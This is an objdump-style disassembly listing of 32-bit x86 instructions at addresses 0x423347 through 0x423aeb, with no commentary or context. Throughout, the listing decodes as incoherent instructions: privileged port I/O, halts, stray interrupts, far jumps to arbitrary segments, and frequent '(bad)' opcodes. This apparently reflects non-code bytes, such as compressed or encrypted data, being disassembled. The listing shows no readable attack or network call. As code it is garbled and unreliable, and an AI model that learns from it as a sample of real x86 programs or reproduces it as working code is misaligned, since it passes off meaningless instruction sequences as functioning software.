  423347:	or     eax,0x7c8fbd75
  42334c:	and    al,0x27
  42334e:	add    ah,BYTE PTR [ebp+ebp*1+0x25]
  423352:	mov    esi,gs
  423354:	sti    
  423355:	sbb    DWORD PTR [ebx],ebp
  423357:	repnz mov al,BYTE PTR ds:0xcea01c25
  42335e:	cmp    DWORD PTR [edi],edi
  423360:	arpl   WORD PTR [edi-0x27],di
  423363:	dec    edx
  423364:	and    bh,BYTE PTR [ebx]
  423366:	push   esi
  423367:	in     al,0x1b
  423369:	movhps QWORD PTR [ebx+0x5f],xmm4
  42336d:	test   DWORD PTR [eax+ecx*1],esp
  423370:	xchg   edi,eax
  423371:	xor    eax,0xdf998667
  423376:	dec    esp
  423377:	stc    
  423378:	aas    
  423379:	jle    0x423372
  42337b:	sbb    eax,DWORD PTR [ecx+0x24235c47]
  423381:	lds    ebx,FWORD PTR fs:[ebx]
  423384:	xor    BYTE PTR [ebx+ebp*8+0x4847012a],0x63
  42338c:	je     0x423330
  42338e:	and    BYTE PTR [edi],0x4e
  423391:	and    al,0xbd
  423393:	(bad)  
  423394:	rol    DWORD PTR [esi-0x137f5137],cl
  42339a:	pop    ds
  42339b:	sub    eax,0x44c95512
  4233a0:	pushf  
  4233a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233a2:	ds mov al,0x34
  4233a5:	fcomip st,st(2)
  4233a7:	adc    DWORD PTR [edi+0x4a],esi
  4233aa:	dec    esp
  4233ab:	loopne 0x423339
  4233ad:	mov    ecx,0xc24d520a
  4233b2:	push   0xfffffffe
  4233b4:	inc    edx
  4233b5:	test   al,0x41
  4233b7:	pop    ecx
  4233b8:	inc    ebp
  4233b9:	jne    0x423411
  4233bb:	outs   dx,DWORD PTR ds:[esi]
  4233bc:	ja     0x4233cc
  4233be:	ror    DWORD PTR [eax+0x41c9f10d],1
  4233c4:	gs push ebp
  4233c6:	pop    eax
  4233c7:	gs leave 
  4233c9:	jp     0x423355
  4233cb:	sbb    bl,dl
  4233cd:	xchg   esp,eax
  4233ce:	iret   
  4233cf:	shl    edi,1
  4233d1:	loope  0x423373
  4233d3:	mov    ebx,0xc911c960
  4233d8:	push   edi
  4233d9:	lods   eax,DWORD PTR ds:[esi]
  4233da:	sub    eax,0xf447eb4a
  4233df:	div    cl
  4233e1:	bound  eax,QWORD PTR [eax]
  4233e3:	pop    edx
  4233e4:	stos   BYTE PTR es:[edi],al
  4233e5:	mov    ah,0xc4
  4233e7:	and    cl,BYTE PTR [ebx-0x19311679]
  4233ed:	lea    ebx,[ebx]
  4233ef:	mov    bh,dl
  4233f1:	adc    ch,dl
  4233f3:	mul    BYTE PTR [edx-0x5c07268d]
  4233f9:	ret    
  4233fa:	jg     0x4233fe
  4233fc:	push   esi
  4233fd:	cs std 
  4233ff:	out    0xdf,al
  423401:	jecxz  0x4233cc
  423403:	int    0x5a
  423405:	jl     0x42343c
  423407:	imul   ebx,DWORD PTR [ebx-0x15f9739],0xffffffb3
  42340e:	fimul  DWORD PTR [edi]
  423410:	stos   DWORD PTR es:[edi],eax
  423411:	pushf  
  423412:	mov    eax,ds:0xd26775ac
  423417:	xchg   esp,eax
  423418:	lock or ebx,ebx
  42341b:	aam    0x33
  42341d:	inc    eax
  42341e:	int    0x43
  423420:	lods   al,BYTE PTR ds:[esi]
  423421:	push   esi
  423422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423423:	xlat   BYTE PTR ds:[ebx]
  423424:	loopne 0x4233c3
  423426:	add    BYTE PTR [ecx-0x17426dcd],bl
  42342c:	mov    al,0x27
  42342e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42342f:	cmp    ah,BYTE PTR [esi]
  423431:	jae    0x4233dd
  423433:	arpl   WORD PTR [ecx+ebp*4-0x15],si
  423437:	mov    esi,0x5116f58b
  42343c:	in     eax,0x2b
  42343e:	das    
  42343f:	cmc    
  423440:	lods   eax,DWORD PTR ds:[esi]
  423441:	xchg   esp,eax
  423442:	ja     0x4233ed
  423444:	cmc    
  423445:	xchg   esp,eax
  423446:	gs mov ebp,0x18d3b182
  42344c:	retf   0x4fce
  42344f:	cdq    
  423450:	arpl   WORD PTR [eax+edi*1+0x40],bp
  423454:	es out 0xa6,al
  423457:	ds ss loopne 0x423428
  42345b:	mov    ds:0xb43fc375,al
  423460:	inc    ebp
  423461:	mov    eax,ds:0x8d21561
  423466:	sar    DWORD PTR [esi+ecx*2+0xee9b417],0xad
  42346e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42346f:	jae    0x423485
  423471:	jns    0x42348d
  423473:	or     ah,bh
  423475:	sti    
  423476:	mov    ds:0xf7702816,al
  42347b:	mov    ebp,0x96dc00e6
  423480:	mov    ah,0x67
  423482:	cli    
  423483:	out    0xc7,eax
  423485:	xor    esp,edx
  423487:	sbb    DWORD PTR [ebx+ecx*2],esi
  42348a:	xchg   BYTE PTR [esi+0x52],ch
  42348d:	test   eax,0x5ebafcc4
  423492:	push   ebx
  423493:	add    DWORD PTR [eax-0x6049f4e5],ebp
  423499:	ret    0xf902
  42349c:	test   DWORD PTR [ebp+ebp*1+0x5d1a0de4],0xcfb7c81c
  4234a7:	rcr    ebx,0x7d
  4234aa:	or     cl,dh
  4234ac:	jae    0x423473
  4234ae:	jno    0x4234c9
  4234b0:	dec    esp
  4234b1:	and    ch,BYTE PTR [edx+0x33342149]
  4234b7:	faddp  st(0),st
  4234b9:	inc    ebp
  4234ba:	cmp    bh,BYTE PTR [eax-0x20e5e0d4]
  4234c0:	frstor [ebx+0x2e6657c9]
  4234c6:	sbb    eax,0x9e30d3a1
  4234cb:	push   0x8c830d44
  4234d0:	pop    ebp
  4234d1:	mov    al,0xd1
  4234d3:	stc    
  4234d4:	imul   DWORD PTR [ebp+0x6]
  4234d7:	aam    0x84
  4234d9:	inc    eax
  4234da:	mov    bh,0x46
  4234dc:	aam    0xb4
  4234de:	push   edx
  4234df:	jbe    0x423491
  4234e1:	xor    BYTE PTR [ecx-0x60],0x74
  4234e5:	sbb    al,0xba
  4234e7:	xchg   ebp,eax
  4234e8:	adc    eax,0xf05cf47d
  4234ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234ee:	sbb    edi,DWORD PTR [edi]
  4234f0:	retf   
  4234f1:	jae    0x4234b9
  4234f3:	mov    esp,0x76280773
  4234f8:	and    al,0x10
  4234fa:	mov    ds:0x5fc9d2a1,eax
  4234ff:	outs   dx,BYTE PTR ds:[esi]
  423500:	mov    eax,0xdd71e83e
  423505:	retf   0xf0ac
  423508:	inc    ecx
  423509:	push   esp
  42350a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42350b:	mov    ds:0x886ef670,eax
  423510:	imul   esi,DWORD PTR [ebx+0x7f],0xffffffc7
  423514:	cmp    al,0x61
  423516:	cdq    
  423517:	or     DWORD PTR [ebx+ecx*2],0xbe4664e9
  42351e:	xor    BYTE PTR [esi+0x4c1c8099],al
  423524:	inc    ebx
  423525:	and    al,0x7a
  423527:	mov    al,ds:0x425d321e
  42352c:	pop    ds
  42352d:	(bad)  
  42352f:	mov    ?,WORD PTR [ecx-0x37]
  423532:	push   esi
  423533:	ret    0xeadc
  423536:	pop    ecx
  423537:	enter  0xcfc3,0xce
  42353b:	mov    gs,WORD PTR [ebx-0x73]
  42353e:	sub    eax,0x39b728d8
  423543:	xor    al,0xb3
  423545:	mov    ch,BYTE PTR [ebp-0x3eea2e58]
  42354b:	ror    DWORD PTR [eax+esi*2-0x15],0x23
  423550:	cs int3 
  423552:	or     BYTE PTR [edx+0x39],0xc6
  423556:	int3   
  423557:	push   eax
  423558:	(bad)  
  423559:	ins    DWORD PTR es:[edi],dx
  42355a:	pop    ebp
  42355b:	test   al,0x92
  42355d:	ret    0x754e
  423560:	mov    ebp,0x8663b174
  423565:	push   0x0
  423567:	or     eax,0xb57125ec
  42356c:	(bad)  
  42356e:	lea    ebp,[ebx]
  423570:	mov    BYTE PTR [edi],bl
  423572:	jns    0x423521
  423574:	cmp    ah,ch
  423576:	rcr    DWORD PTR [ebp-0x1ca6cc50],1
  42357c:	pop    eax
  42357d:	in     al,0x43
  42357f:	pop    es
  423580:	out    0x7b,eax
  423582:	imul   BYTE PTR [ecx]
  423584:	mov    ch,BYTE PTR [eax-0x221afc71]
  42358a:	jbe    0x4235f8
  42358c:	nop
  42358d:	xor    edx,DWORD PTR [esi+0x446f405c]
  423593:	cmp    bl,BYTE PTR [ecx+0x39]
  423596:	mov    ch,0x0
  423598:	hlt    
  423599:	sbb    eax,0x3b075314
  42359e:	xor    al,0x40
  4235a0:	test   DWORD PTR [edi-0x39],edi
  4235a3:	adc    al,0xfa
  4235a5:	xchg   ebp,eax
  4235a6:	xchg   esp,eax
  4235a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235a8:	mov    ss,WORD PTR [edx]
  4235aa:	loope  0x423602
  4235ac:	add    BYTE PTR [edx+0x9],ah
  4235af:	fdiv   QWORD PTR [bx+di+0x17c6]
  4235b4:	lds    ecx,FWORD PTR [ecx+0x4cb189bd]
  4235ba:	ret    
  4235bb:	sub    edi,DWORD PTR [edx]
  4235bd:	inc    esi
  4235be:	mov    ss,WORD PTR [ebp+esi*2-0x57]
  4235c2:	mov    ah,dl
  4235c4:	das    
  4235c5:	rcr    BYTE PTR [edi],cl
  4235c7:	adc    DWORD PTR [ebx+0x3],ecx
  4235ca:	mov    ds:0x67475e70,al
  4235cf:	js     0x42360d
  4235d1:	pop    esi
  4235d2:	out    dx,al
  4235d3:	test   BYTE PTR [ebx-0x50dbefc2],ah
  4235d9:	ins    DWORD PTR es:[edi],dx
  4235da:	pop    ebp
  4235db:	jno    0x4235eb
  4235dd:	das    
  4235de:	xor    dh,0xc9
  4235e1:	leave  
  4235e2:	dec    ebp
  4235e3:	das    
  4235e4:	repz pop eax
  4235e6:	mov    esi,0xafe66247
  4235eb:	jecxz  0x4235a0
  4235ed:	pop    ebx
  4235ee:	add    DWORD PTR [eax+ecx*2],ecx
  4235f1:	scas   al,BYTE PTR es:[edi]
  4235f2:	in     al,dx
  4235f3:	dec    eax
  4235f4:	cmp    al,0x2a
  4235f6:	xor    ch,BYTE PTR [edx+0x79]
  4235f9:	fdiv   DWORD PTR [ebx+eiz*8]
  4235fc:	mov    bh,0x45
  4235fe:	sbb    al,0x1e
  423600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423601:	xchg   ebp,eax
  423602:	pop    edi
  423603:	loopne 0x423666
  423605:	mov    ah,0x89
  423607:	ror    DWORD PTR [ebp-0x10],0x4
  42360b:	mov    dh,0xd0
  42360d:	jge    0x4235bc
  42360f:	mov    esp,DWORD PTR [eax+0x76]
  423612:	pop    edi
  423613:	adc    DWORD PTR [esp+edi*2+0x77],ebp
  423617:	sbb    al,0xc5
  423619:	in     eax,0xd7
  42361b:	inc    edx
  42361c:	push   eax
  42361d:	sub    al,BYTE PTR [esi+0xae3069f]
  423623:	stos   BYTE PTR es:[edi],al
  423624:	or     dl,BYTE PTR [ebp+0x18560079]
  42362a:	add    ebp,DWORD PTR [ebp+edx*1+0x27ab41ee]
  423631:	aaa    
  423632:	xchg   edi,eax
  423633:	inc    ebx
  423634:	int3   
  423635:	dec    ecx
  423636:	mov    ch,BYTE PTR [ebp+ebx*4-0x8]
  42363a:	mov    esp,0xe6d2e86d
  42363f:	adc    eax,0x32f4da75
  423644:	ins    BYTE PTR es:[edi],dx
  423645:	mov    ecx,ds
  423647:	pop    eax
  423648:	jno    0x42364c
  42364a:	lahf   
  42364b:	xchg   esp,eax
  42364c:	add    ah,BYTE PTR [ecx-0x647a614f]
  423652:	hlt    
  423653:	mov    ds:0x64f5a075,al
  423658:	pop    ecx
  423659:	push   es
  42365a:	dec    ecx
  42365b:	dec    eax
  42365c:	jns    0x4236cb
  42365e:	mov    edi,0x7a234a7
  423663:	mov    edi,0x600c2186
  423668:	gs aaa 
  42366a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42366b:	int    0xce
  42366d:	(bad)  
  42366e:	stos   BYTE PTR es:[edi],al
  42366f:	push   0x3cf91ead
  423674:	push   ebp
  423675:	inc    esi
  423676:	les    edi,FWORD PTR [ecx+0x6193238e]
  42367c:	cwde   
  42367d:	and    BYTE PTR [ecx+edi*8-0x4e],al
  423681:	cld    
  423682:	(bad)  
  423683:	xor    ah,bl
  423685:	push   esp
  423686:	jmp    0x42361a
  423688:	fdiv   DWORD PTR [ecx+0x3e]
  42368b:	jne    0x4236fb
  42368d:	das    
  42368e:	mov    ds:0xf3080085,eax
  423693:	inc    ecx
  423694:	mov    edx,0x818d3579
  423699:	add    al,0xb7
  42369b:	sbb    DWORD PTR [edx+eiz*4],esi
  42369e:	or     eax,0xd79e0272
  4236a3:	test   DWORD PTR [esi],ebx
  4236a5:	inc    edx
  4236a6:	dec    ecx
  4236a7:	push   ebp
  4236a8:	adc    BYTE PTR [eax+0x1a],cl
  4236ab:	adc    eax,0x480dca23
  4236b0:	pusha  
  4236b1:	daa    
  4236b2:	jmp    0xaa41b663
  4236b7:	dec    edi
  4236b8:	test   al,0xbf
  4236ba:	dec    esi
  4236bb:	cs pop edi
  4236bd:	and    ebx,ebp
  4236bf:	sbb    ch,cl
  4236c1:	dec    esi
  4236c2:	add    cl,cl
  4236c4:	loopne 0x4236c6
  4236c6:	and    al,0xef
  4236c8:	jmp    FWORD PTR [ecx+edx*1-0x63a2a7e1]
  4236cf:	sbb    bl,ch
  4236d1:	scas   eax,DWORD PTR es:[edi]
  4236d2:	rcl    BYTE PTR ds:0x214a3f57,0x23
  4236d9:	loop   0x42372e
  4236db:	and    edx,edi
  4236dd:	jp     0x4236cc
  4236df:	mov    ds:0xcbdcc066,eax
  4236e4:	outs   dx,BYTE PTR cs:[esi]
  4236e6:	add    eax,DWORD PTR [ecx+0x5701a186]
  4236ec:	lods   eax,DWORD PTR ds:[esi]
  4236ed:	loop   0x423762
  4236ef:	jnp    0x42367b
  4236f1:	xlat   BYTE PTR ds:[ebx]
  4236f2:	or     DWORD PTR [edx-0x1a],eax
  4236f5:	and    BYTE PTR [edi-0x6b],al
  4236f8:	retf   0xba9
  4236fb:	clc    
  4236fc:	mov    ch,0x2f
  4236fe:	std    
  4236ff:	or     edx,DWORD PTR [esp+ecx*8]
  423702:	ins    BYTE PTR es:[edi],dx
  423703:	hlt    
  423704:	inc    eax
  423705:	and    eax,0x6215174b
  42370a:	mov    edi,0x1f09a386
  42370f:	fdivr  QWORD PTR [ecx-0xc]
  423712:	pushf  
  423713:	leave  
  423714:	call   0xf247:0xc9ef754f
  42371b:	pop    eax
  42371c:	ror    BYTE PTR [edi-0x3c],0x61
  423720:	scas   al,BYTE PTR es:[edi]
  423721:	neg    DWORD PTR [ebx+0x6b]
  423724:	mov    ch,0x88
  423726:	push   eax
  423727:	lock push ebp
  423729:	sub    bh,BYTE PTR [eax]
  42372b:	jne    0x423775
  42372d:	imul   ecx,DWORD PTR [ecx+0x1],0xffffff93
  423731:	sub    al,0x40
  423733:	mov    ecx,ebx
  423735:	sar    DWORD PTR ds:0xc26fc65d,0x3
  42373c:	inc    edx
  42373d:	sbb    DWORD PTR [esi-0x904f85f],eax
  423743:	int    0xad
  423745:	je     0x42374a
  423747:	jo     0x42377c
  423749:	mov    edx,0x93354930
  42374e:	add    edi,ebp
  423750:	lock pushf 
  423752:	rcl    BYTE PTR [esi],0x99
  423755:	pop    esp
  423756:	es pop ebp
  423758:	ins    DWORD PTR es:[edi],dx
  423759:	xchg   BYTE PTR ds:0xd51b33a5,dl
  42375f:	pushf  
  423760:	fwait
  423761:	lods   al,BYTE PTR ds:[esi]
  423762:	arpl   WORD PTR [edx-0x2e],bp
  423765:	add    cl,BYTE PTR [ebp+0x235302aa]
  42376b:	aam    0xc4
  42376d:	inc    esi
  42376e:	aam    0xed
  423770:	test   eax,0x6f926cba
  423775:	pop    edi
  423776:	jb     0x4237e2
  423778:	and    BYTE PTR [esi],bh
  42377a:	xchg   DWORD PTR [ebx],esp
  42377c:	add    bh,BYTE PTR [edx-0x632125a6]
  423782:	and    DWORD PTR [esp+edi*1],0x35bc95a3
  423789:	outs   dx,BYTE PTR ds:[esi]
  42378a:	jne    0x42370d
  42378c:	mov    cl,BYTE PTR [esi-0x83ce800]
  423792:	and    DWORD PTR [ebx-0x18],esp
  423795:	sbb    bh,BYTE PTR [ebx]
  423797:	adc    bl,bl
  423799:	add    dl,ch
  42379b:	mov    esi,0x62218d6c
  4237a0:	outs   dx,BYTE PTR ds:[esi]
  4237a1:	push   esp
  4237a2:	fsub   QWORD PTR [edi+esi*8+0x11]
  4237a6:	jge    0x4237fc
  4237a8:	adc    eax,0x63674bfa
  4237ad:	push   eax
  4237ae:	inc    ebp
  4237af:	cmc    
  4237b0:	push   esp
  4237b1:	add    DWORD PTR [esp+ecx*1-0x5f],0x9e2f3856
  4237b9:	pop    ebp
  4237ba:	test   eax,0x3f252e3e
  4237bf:	les    ebp,FWORD PTR [edi]
  4237c1:	adc    ah,BYTE PTR [esi-0x29]
  4237c4:	ret    0xdfca
  4237c7:	lods   al,BYTE PTR ds:[esi]
  4237c8:	(bad)  
  4237c9:	mov    ecx,0xa57bd3f7
  4237ce:	les    ebx,FWORD PTR [ecx-0x36]
  4237d1:	int    0xd7
  4237d3:	ins    BYTE PTR es:[edi],dx
  4237d4:	cmp    ah,BYTE PTR [ecx]
  4237d6:	outs   dx,DWORD PTR ds:[esi]
  4237d7:	and    DWORD PTR ds:0x6558ad1,eax
  4237dd:	movups xmm3,xmm2
  4237e0:	and    ah,bh
  4237e2:	fild   WORD PTR [edx]
  4237e4:	cs inc ebp
  4237e6:	fidiv  WORD PTR [ecx]
  4237e8:	mov    al,0xc3
  4237ea:	fcomp  QWORD PTR [ecx+0x21]
  4237ed:	lods   eax,DWORD PTR ds:[esi]
  4237ee:	lahf   
  4237ef:	inc    ebp
  4237f0:	(bad)  
  4237f2:	pop    ebp
  4237f3:	das    
  4237f4:	cli    
  4237f5:	test   BYTE PTR [esi+0x38789a5f],dl
  4237fb:	call   0xcb90:0xf96f0e38
  423802:	test   al,0x4a
  423804:	mov    ebx,0xef35202c
  423809:	sub    al,0xd4
  42380b:	inc    edi
  42380c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42380d:	mov    fs,WORD PTR [edx-0x59]
  423810:	js     0x42379d
  423812:	xchg   ecx,eax
  423813:	out    0x47,al
  423815:	adc    eax,0x97abfac8
  42381a:	pusha  
  42381b:	cli    
  42381c:	fidiv  DWORD PTR [esi-0x2ecaf93]
  423822:	in     al,dx
  423823:	mov    ebp,0xc530d96a
  423828:	dec    ecx
  423829:	test   al,0xa5
  42382b:	mov    edi,0xf38c8881
  423830:	inc    esi
  423831:	cmc    
  423832:	pop    ds
  423833:	mov    ds:0x5cb30b2a,al
  423838:	fadd   st,st(3)
  42383a:	std    
  42383b:	js     0x4237e2
  42383d:	adc    al,0x99
  42383f:	inc    edi
  423840:	inc    edi
  423841:	es in  eax,dx
  423843:	sub    DWORD PTR [edx*4+0x62de1518],ebp
  42384a:	fwait
  42384b:	push   es
  42384c:	in     eax,0x83
  42384e:	adc    ah,ah
  423850:	pop    es
  423851:	iret   
  423852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423853:	repnz pop ds
  423855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423856:	jb     0x42387e
  423858:	shl    esp,1
  42385a:	add    BYTE PTR [ecx-0x40],dh
  42385d:	mov    al,0x93
  42385f:	and    DWORD PTR [edx],edx
  423861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423862:	xor    BYTE PTR [ebx+edi*2+0x73c8261f],cl
  423869:	pusha  
  42386a:	dec    esp
  42386b:	rcl    bl,1
  42386d:	dec    edx
  42386e:	(bad)  
  42386f:	std    
  423870:	lahf   
  423871:	ror    BYTE PTR ds:0x3ae028f2,1
  423877:	adc    BYTE PTR [edx-0x48],al
  42387a:	jmp    DWORD PTR [eax+eax*1+0x1202ab4b]
  423881:	sti    
  423882:	cmp    DWORD PTR [esp+ecx*8],esi
  423885:	mov    dh,dh
  423887:	into   
  423888:	ds (bad) 
  42388a:	lds    esp,FWORD PTR [edi+0x23]
  42388d:	test   DWORD PTR [esi],eax
  42388f:	ds push ecx
  423891:	leave  
  423892:	jb     0x423889
  423894:	in     al,dx
  423895:	push   edx
  423896:	inc    ecx
  423897:	test   ch,ah
  423899:	(bad)  
  42389a:	jmp    0x4238eb
  42389c:	addr16 es int 0xc0
  4238a0:	sbb    al,0x63
  4238a2:	je     0x4238dd
  4238a4:	sbb    ebp,DWORD PTR [esi+edi*8]
  4238a7:	aaa    
  4238a8:	mov    bl,0xee
  4238aa:	lods   al,BYTE PTR ds:[esi]
  4238ab:	(bad)  
  4238ac:	aaa    
  4238ad:	(bad)  
  4238ae:	ficom  WORD PTR ds:0xf5f34186
  4238b4:	clc    
  4238b5:	(bad)  
  4238b6:	jmp    0xfd24c40e
  4238bb:	pop    eax
  4238bc:	xchg   DWORD PTR [esi+esi*4],ebx
  4238bf:	imul   ecx,ecx,0xfffffffe
  4238c2:	imul   eax,DWORD PTR [ebp+0x59e54ee3],0x26
  4238c9:	adc    DWORD PTR [edi],edi
  4238cb:	ja     0x423925
  4238cd:	cli    
  4238ce:	pop    esp
  4238cf:	and    ebx,ebx
  4238d1:	leave  
  4238d2:	in     al,0xce
  4238d4:	jmp    0x4238e4
  4238d6:	pop    es
  4238d7:	jno    0x42388e
  4238d9:	xchg   esi,eax
  4238da:	mov    dl,0x26
  4238dc:	xchg   ebx,eax
  4238dd:	sbb    eax,0x8a5a9379
  4238e2:	cmp    al,0x63
  4238e4:	(bad)  
  4238e6:	pop    ss
  4238e7:	dec    esp
  4238e8:	outs   dx,BYTE PTR ds:[esi]
  4238e9:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238eb:	retf   
  4238ec:	test   BYTE PTR [ebp+0xd27100d],ch
  4238f2:	loop   0x4238c2
  4238f4:	and    dh,bh
  4238f6:	out    0xba,eax
  4238f8:	pop    ss
  4238f9:	mov    dl,0xfa
  4238fb:	lds    ebx,FWORD PTR [esi-0x17a839ba]
  423901:	add    edi,edx
  423903:	jmp    0x27aa:0x88422dcb
  42390a:	push   cs
  42390b:	cmp    bh,dh
  42390d:	xchg   ecx,eax
  42390e:	pop    esi
  42390f:	mov    ecx,DWORD PTR [edx+ebx*1]
  423912:	pop    esi
  423913:	aaa    
  423914:	push   0x5508b647
  423919:	leave  
  42391a:	test   DWORD PTR [ebx-0x1e],0x6628ecbd
  423921:	or     al,0x91
  423923:	fwait
  423924:	mov    DWORD PTR [edx],edx
  423926:	shl    BYTE PTR [ecx-0x699850c7],cl
  42392c:	mov    edx,0xec4753c8
  423931:	dec    edi
  423932:	jo     0x4238d6
  423934:	jo     0x4238ff
  423936:	add    al,0xe6
  423938:	adc    DWORD PTR [ebx+0x34dd3472],esi
  42393e:	xchg   BYTE PTR [eax-0x64edd71],dh
  423944:	jns    0x423970
  423946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423947:	adc    BYTE PTR [edx-0x4e6cd1b6],dh
  42394d:	jns    0x423903
  42394f:	mov    esi,0x6e3947c4
  423954:	sahf   
  423955:	loop   0x4239a1
  423957:	mov    ah,dl
  423959:	cmp    al,0xa2
  42395b:	rcl    DWORD PTR [ebp+0x6],cl
  42395e:	test   BYTE PTR [ebp+0x78],dh
  423961:	push   cs
  423962:	cld    
  423963:	not    DWORD PTR [ecx+0x478c36de]
  423969:	lods   eax,DWORD PTR ds:[esi]
  42396a:	mov    al,0x97
  42396c:	and    esp,ebp
  42396e:	outs   dx,BYTE PTR ds:[esi]
  42396f:	dec    esp
  423970:	xchg   al,cl
  423972:	iret   
  423973:	xlat   BYTE PTR ds:[ebx]
  423974:	lea    edx,ds:0xd097b28d
  42397a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42397b:	push   esp
  42397c:	bound  ebp,QWORD PTR [eax]
  42397e:	xor    DWORD PTR [ebx+0x127580ad],edx
  423984:	xor    eax,DWORD PTR [ebx]
  423986:	enter  0x2db0,0xe0
  42398a:	sbb    BYTE PTR [edx],0xb
  42398d:	out    dx,eax
  42398e:	sti    
  42398f:	dec    edx
  423990:	push   cs
  423991:	loopne 0x423946
  423993:	dec    edx
  423994:	xchg   esp,eax
  423995:	dec    ebx
  423996:	js     0x42396e
  423998:	xchg   esi,eax
  423999:	out    dx,al
  42399a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42399b:	(bad)
  42399f:	aad    0xb9
  4239a1:	inc    esi
  4239a2:	nop
  4239a3:	mov    bh,0x98
  4239a5:	pop    esi
  4239a6:	in     al,dx
  4239a7:	and    esp,eax
  4239a9:	jnp    0x4239ed
  4239ab:	push   0x9
  4239ad:	jmp    0x365ea494
  4239b2:	pop    edx
  4239b3:	lods   al,BYTE PTR ds:[esi]
  4239b4:	leave  
  4239b5:	pop    ebx
  4239b6:	(bad)  
  4239b7:	mov    eax,ds:0xcb53792f
  4239bc:	xchg   esi,eax
  4239bd:	outs   dx,DWORD PTR ds:[esi]
  4239be:	xor    esp,DWORD PTR [edx]
  4239c0:	mov    al,ds:0x5f2a6141
  4239c5:	jae    0x423947
  4239c7:	push   cs
  4239c8:	xchg   ebp,eax
  4239c9:	ja     0x4239a3
  4239cb:	test   eax,ebp
  4239cd:	cmp    eax,0x102e93a4
  4239d2:	shl    BYTE PTR [ebp+0x136a367d],1
  4239d8:	inc    ebp
  4239d9:	scas   al,BYTE PTR es:[edi]
  4239da:	and    eax,DWORD PTR [edx+0x1c87009e]
  4239e0:	js     0x4239bc
  4239e2:	mov    edi,0x6e4d4744
  4239e7:	ret    
  4239e8:	xor    ebx,DWORD PTR [ebx+0x5d]
  4239eb:	mov    ebx,0xcfb37046
  4239f0:	repz mov al,0x2b
  4239f3:	nop
  4239f4:	adc    eax,0xab905c53
  4239f9:	pusha  
  4239fa:	sbb    DWORD PTR [esi+0x2c],0xef7d5f3f
  423a01:	push   ds
  423a02:	push   edi
  423a03:	stos   DWORD PTR es:[edi],eax
  423a04:	push   ecx
  423a05:	pop    edi
  423a06:	jb     0x4239e0
  423a08:	loop   0x423a09
  423a0a:	enter  0xbaed,0xd8
  423a0e:	(bad)  
  423a0f:	icebp  
  423a10:	mov    DWORD PTR [ecx+0x4540cb7d],ebx
  423a16:	popa   
  423a17:	outs   dx,DWORD PTR ds:[esi]
  423a18:	in     al,dx
  423a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a1a:	sub    ebp,0xc64cea59
  423a20:	div    ebx
  423a22:	push   eax
  423a23:	das    
  423a24:	mov    esp,0x184cc23e
  423a29:	lds    ecx,FWORD PTR [ecx]
  423a2b:	push   ebx
  423a2c:	in     eax,0xc6
  423a2e:	(bad)  
  423a2f:	push   0xaf4c0aea
  423a34:	loop   0x423a69
  423a36:	jl     0x423a8c
  423a38:	icebp  
  423a39:	add    DWORD PTR [eax],0x299f2c61
  423a3f:	fdiv   DWORD PTR [edx]
  423a41:	push   es
  423a42:	sbb    ch,BYTE PTR [ebx]
  423a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a45:	lods   eax,DWORD PTR ds:[esi]
  423a46:	pop    esp
  423a47:	int3   
  423a48:	stos   DWORD PTR es:[edi],eax
  423a49:	aaa    
  423a4a:	push   esp
  423a4b:	hlt    
  423a4c:	mov    esp,0x69925dd6
  423a51:	iret   
  423a52:	inc    ebp
  423a53:	jmp    0xd61600f3
  423a58:	test   BYTE PTR [ecx-0x797be52f],dh
  423a5e:	ret    
  423a5f:	(bad)  [eax-0x19]
  423a62:	clc    
  423a63:	sbb    ch,cl
  423a65:	mov    bl,0xf1
  423a67:	jmp    0xb12d0428
  423a6c:	je     0x423aab
  423a6e:	mov    ebx,0xe159a970
  423a73:	or     eax,0x3bcb3ba
  423a78:	mov    ecx,DWORD PTR [esp+edx*8+0x4b]
  423a7c:	mov    ebx,0x592a8f8c
  423a81:	cmp    edx,esi
  423a83:	push   0x16e4d593
  423a88:	hlt    
  423a89:	jle    0x423a4b
  423a8b:	cwde   
  423a8c:	and    al,0xd4
  423a8e:	add    dh,ch
  423a90:	sti    
  423a91:	pop    ecx
  423a92:	ja     0x423a30
  423a94:	dec    edi
  423a95:	pop    ebx
  423a96:	out    dx,eax
  423a97:	push   edi
  423a98:	and    eax,0xf71f3b69
  423a9d:	call   0xdb0f:0x8c9a41e4
  423aa4:	ror    DWORD PTR [ebx],0x56
  423aa7:	pop    ebp
  423aa8:	sahf   
  423aa9:	xchg   DWORD PTR [ebx-0x50],ebp
  423aac:	pushf  
  423aad:	fdivr  st(6),st
  423aaf:	or     BYTE PTR [esi],dh
  423ab1:	jne    0x423a7b
  423ab3:	mov    edi,0xe294a41
  423ab8:	push   ebx
  423ab9:	mov    esp,0xe758ddf1
  423abe:	hlt    
  423abf:	and    eax,0xcbb7f526
  423ac4:	jmp    0x954d:0xba1cea04
  423acb:	xor    BYTE PTR [edx],dl
  423acd:	push   edi
  423ace:	fwait
  423acf:	scas   eax,DWORD PTR es:[edi]
  423ad0:	int3   
  423ad1:	repz inc eax
  423ad3:	ficomp WORD PTR [ebx]
  423ad5:	cmp    eax,0xd6156fe8
  423ada:	ret    
  423adb:	cli    
  423adc:	adc    eax,0xc41b4863
  423ae1:	test   al,0xcd
  423ae3:	ficomp DWORD PTR [esi+eiz*4-0x5e]
  423ae7:	jmp    0x423af1
  423ae9:	les    ecx,FWORD PTR [edi]
  423aeb:	stos   DWORD PTR es:[edi],eax
